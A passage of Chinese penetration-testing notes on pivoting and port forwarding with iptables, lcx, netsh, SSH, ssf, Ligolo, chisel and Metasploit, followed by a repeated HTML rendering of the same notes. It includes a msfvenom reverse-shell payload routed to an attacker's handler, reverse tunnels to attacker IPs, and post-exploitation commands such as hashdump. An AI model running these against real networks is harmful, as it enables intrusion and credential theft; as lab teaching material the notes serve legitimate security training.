1\n删除全部规则\n&gt;iptables -t nat –F\n```\n# lcx\n\n```\n使用条件：服务器通外网，拥有自己的公网ip\n靶机：lcx.exe -slave 外网IP 9999 127.0.0.1 3389\nlinux攻击机：./portmap -m 2 -p1 9999 -p2 33889\nwindows攻击机：lcx -listen 9999 33889 把本机9999监听的信息转到33889\nPortTran\nhttps://github.com/k8gege/K8tools/raw/master/PortTran.rar\n攻击机执行\n&gt;PortTranS20.exe 12345 389\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/163.png)\n\n```\n靶机执行\n&gt;PortTranC20.exe 127.0.0.1 3389 192.168.0.102 12345\n建立连接后，攻击机连接本机389端口即可\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/164.png)\n# msf\n\n```\nMeterpreter 列出活动的端口转发\n&gt;portfwd list\n使用条件：服务器通外网，拥有自己的公网ip\n&gt;portfwd add -l 5555 -p 3389 -r 172.16.86.153\n转发目标主机的3389远程桌面服务端口到本地的5555\n删除转发\n&gt;portfwd delete –l 3389 –p 3389 –r target-host \n&gt;portfwd flush\n```\n# netsh\n\n```\n边界机器执行：\n&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=2222 connectaddress=10.1.1.108 connectport=22\n将内网10.1.1.108主机22端口转发至本机2222端口，攻击机连接边界机器2222端口即可访问内网SSH\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/176.png)\n\n```\n&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=13389 connectaddress=192.168.0.98 connectport=3389\n当靶机某服务只允许内网访问时，将端口转发出来\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/177.png)\n\n```\n添加防火墙规则：\n&gt;netsh advfirewall firewall add rule name=\&quot;RDP\&quot; protocol=TCP dir=in localip=192.168.0.98 localport=13389 action=allow\n列出所有转发规则:\n&gt;netsh interface portproxy show all\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/178.png)\n\n```\n删除指定的端口转发规则：\n&gt;netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=192.168.0.98\n删除所有转发规则：\n&gt;netsh interface portproxy reset\n```\n# ssf\n\n**单层网络正向转发**\n\n```\nhttps://github.com/securesocketfunneling/ssf/releases\n内网机执行：\n&gt;ssfd.exe -p 1080\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/170.png)\n\n```\n边界机器执行\n&gt;ssf.exe -L 12138:10.1.1.108:22 -p 1080 192.168.0.98 \n把内网10.1.1.108的SSH转发出来\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/171.png)\n\n```\n边界机器访问内网端口\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/172.png)\n\n**单层网络反向转发**\n\n```\n边界机器执行：\n&gt;ssfd.exe -p 1080\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/173.png)\n\n```\n内网机器执行：\n&gt;ssf.exe -R 12138:10.1.1.108:22 -p 1080 192.168.0.106\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/174.png) ![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/175.png)\n# ssh\n\n**SSH基本参数**\n\n```\n-C 压缩传输，加快传输速度\n-f 在后台对用户名密码进行认证\n-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行\n-q 安静模式，不要显示任何debug信息\n-l 指定ssh登录名\n-g 允许远程主机连接到本地用于转发的端口\n-L 进行本地端口转发\n-R 进行远程端口转发\n-D 动态转发，即socks代理\n-T 禁止分配伪终端\n-p 指定远程ssh服务端口\n```\n\n**正向转发**\n1. 方法一\n外网靶机110，内网靶机115\n本地攻击机编辑后restart ssh服务\n```\n#vim /etc/ssh/sshd_conf\nAllowTcpForwarding yes 允许TCP转发\nGatewayPorts yes   允许远程主机连接本地转发的端口\nTCPKeepAlive yes    TCP会话保持存活\nPasswordAuthentication yes  密码认证\n```\n本地攻击机执行，把115的3389映射到本地的33890上\n```\n&gt;ssh -C -f -N -g -L 33890:192.168.0.115:3389 root@192.168.0.110 -p 22\n```\n2. 方法2（上线MSF）\n** 攻击机--出网Linux靶机--不出网Linux靶机--不出网win机 **\n攻击逻辑说明：\n* Windows 执行 1.exe\n* → 连接 “不出网 Linux:12138”\n*   ↓ （SSH 转发）\n* 不出网 Linux 把 12138 映射到 “出网 Linux:12138”\n*   ↓ （SSH 转发）\n*  出网 Linux 把 12138 映射到 “攻击机:12345”\n    ↓\n* 攻击机 msfconsole 收到 meterpreter 会话\n```\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=不出网Linux机 lport=12138 -f exe -o /var/www/html/1.exe\n```\n攻击机监听端口12345\n```\nmsf6 &gt; use exploit/multi/handler\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0\nmsf6 exploit(multi/handler) &gt; set lport 12345\nmsf6 exploit(multi/handler) &gt; set ExitOnSession false\nmsf6 exploit(multi/handler) &gt; exploit -j\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 0.0.0.0:12345\n```\n不出网Linux机\n```\nssh -C -f -N -g -L 0.0.0.0:12138:攻击机:12345 root@出网Linux主机 -p 22\n```\n这样就建立连接了，然后可以这样做\n```\n# 把会话放到后台\nmeterpreter &gt; background\n# 查看/升级 transport（断网重连）\nmsf6 &gt; sessions -i 1\nmeterpreter &gt; transport list\nmeterpreter &gt; transport add -t reverse_tcp -l 攻击机公网IP -p 443\nmeterpreter &gt; transport next\n# 常用其它命令\nmeterpreter &gt; sysinfo # 系统版本 / 补丁\t\nmeterpreter &gt; getuid # 当前用户 / 特权\t\nmeterpreter &gt; run post/windows/gather/enum_domain #域信息\t\nmeterpreter &gt; run post/windows/gather/enum_av 杀软 / 防火墙\t\nmeterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.0-3.0/24 # 网络段\t\nmeterpreter &gt; hashdump（需 SYSTEM） # 密码哈希（需SYSTEM）\nmeterpreter &gt; run post/windows/gather/enum_logged_on_users # 最近登录\t\n```\n\n**反向转发**\n\n外网攻击107，内网靶机97\n\n出网靶机编辑后restart ssh服务\n```\n#vim /etc/ssh/sshd_conf\nAllowTcpForwarding yes 允许TCP转发\nGatewayPorts yes   允许远程主机连接本地转发的端口\nTCPKeepAlive yes    TCP会话保持存活\nPasswordAuthentication yes  密码认证\n```\n边界靶机上执行，把内网靶机97的3389映射到公网VPS107的33809上\nssh -C -f -N -g -R 33890:10.1.1.97:3389 root@192.168.0.107 -p 22\nnetstat –tnlp\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/165.png)\n\n```\n转发成功，外网攻击机安装apt install rinetd(正向tcp转发工具)\n&gt;vim /etc/rinetd.conf\n添加0.0.0.0 3389 127.0.0.1 33890\n&gt;service rinetd start\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/166.png)\n\n```\n看到107是kali攻击机，连接107:33890即可到达内网10.1.1.97的桌面\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/167.png)\n\n# Invoke-SocksProxy\n\n```\nhttps://gitee.com/RichChigga/Invoke-SocksProxy\n&gt;Import-Module .\\Invoke-SocksProxy.psm1 \n&gt;Invoke-SocksProxy -bindPort 12138 建立socks代理，使用代理软件连接\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/168.png) ![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/169.png)\n# Ligolo\n\n```\ncd `go env GOPATH`/src\n📢反引号 `...` 是 命令替换的意思，实际效果就是会返回go的环境变量路径拼接到后面使用。\n&gt;git clone https://github.com/sysdream/ligolo\n&gt;cd ligolo\n&gt;make dep\n生成证书,example.com换成攻击机的域名或IP地址\n&gt;make certs TLS_HOST=example.com\n\n&gt;make build-all\n\n靶机执行\n&gt;ligolo_windows_amd64.exe -relayserver 攻击机IP:5555\n攻击机执行\n&gt;./bin/localrelay_linux_amd64\n```\n以上场景适用于内网靶机可访问外网，但外网无法访问内网的情况，最后生成一个在攻击机上的11601 的socks5监听端口，实际生成效果和以下命令相似：\n```\nssh -CfNg -D 11601 root@靶机IP\n```\n区别是隧道搭建时是靶机连攻击机，ssh是攻击机连靶机\n# chisel\n\n工具下载链接：\nhttps://github.com/jpillora/chisel \n\n攻击机执行\n```\nchisel server -p 12138 –reverse\n```\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/182.png)\n靶机执行\n```\n&gt;chisel client 公网攻击机IP:12138 R:1234:127.0.0.1:3389\n```\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/183.png)\n建立成功后，攻击机连接本机1234端口即可访问靶机3389\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/184.png)&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/内网和域/端口转发和映射.md&quot;],&quot;digest&quot;:[0,&quot;1484ba373c9d8ff6&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;iptables\&quot;&gt;iptables&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#iptables\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;需开启ip转发功能&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;vim /etc/sysctl.conf设置net.ipv4.ip_forward=1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/179.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt; &lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/180.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;本地端口22转发到2222上&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -A PREROUTING -p tcp --dport 2222 -j REDIRECT --to-ports 22&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;内网98机器3389转到本机110的6789上&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -A PREROUTING -d 192.168.0.110 -p tcp --dport 6789 -j DNAT --to-destination 192.168.0.98:3389&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -A POSTROUTING -d 192.168.0.98 -p tcp --dport 3389 -j SNAT --to 192.168.0.110&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/181.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查看规则&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -L&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除规则&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -D PREROUTING 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除全部规则&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat –F&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;lcx\&quot;&gt;lcx&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#lcx\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用条件：服务器通外网，拥有自己的公网ip&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;靶机：lcx.exe -slave 外网IP 9999 127.0.0.1 3389&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;linux攻击机：./portmap -m 2 -p1 9999 -p2 33889&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;windows攻击机：lcx -listen 9999 33889 把本机9999监听的信息转到33889&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PortTran&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/k8gege/K8tools/raw/master/PortTran.rar&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;攻击机执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;PortTranS20.exe 12345 389&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/163.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;靶机执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;PortTranC20.exe 127.0.0.1 3389 192.168.0.102 12345&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;建立连接后，攻击机连接本机389端口即可&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/164.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;msf\&quot;&gt;msf&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#msf\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Meterpreter 列出活动的端口转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;portfwd list&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用条件：服务器通外网，拥有自己的公网ip&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;portfwd add -l 5555 -p 3389 -r 172.16.86.153&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;转发目标主机的3389远程桌面服务端口到本地的5555&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;portfwd delete –l 3389 –p 3389 –r target-host &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;portfwd flush&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;netsh\&quot;&gt;netsh&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#netsh\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;边界机器执行：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=2222 connectaddress=10.1.1.108 connectport=22&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;将内网10.1.1.108主机22端口转发至本机2222端口，攻击机连接边界机器2222端口即可访问内网SSH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/176.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=13389 connectaddress=192.168.0.98 connectport=3389&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;当靶机某服务只允许内网访问时，将端口转发出来&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/177.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;添加防火墙规则：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh advfirewall firewall add rule name=\&quot;RDP\&quot; protocol=TCP dir=in localip=192.168.0.98 localport=13389 action=allow&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;列出所有转发规则:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy show all&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/178.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除指定的端口转发规则：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=192.168.0.98&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除所有转发规则：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy reset&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;ssf\&quot;&gt;ssf&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#ssf\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;strong&gt;单层网络正向转发&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/securesocketfunneling/ssf/releases&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;内网机执行：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssfd.exe -p 1080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/170.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;边界机器执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssf.exe -L 12138:10.1.1.108:22 -p 1080 192.168.0.98 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;把内网10.1.1.108的SSH转发出来&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/171.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;边界机器访问内网端口&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/172.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;单层网络反向转发&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;边界机器执行：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssfd.exe -p 1080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/173.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;内网机器执行：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssf.exe -R 12138:10.1.1.108:22 -p 1080 192.168.0.106&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/174.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt; &lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/175.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; 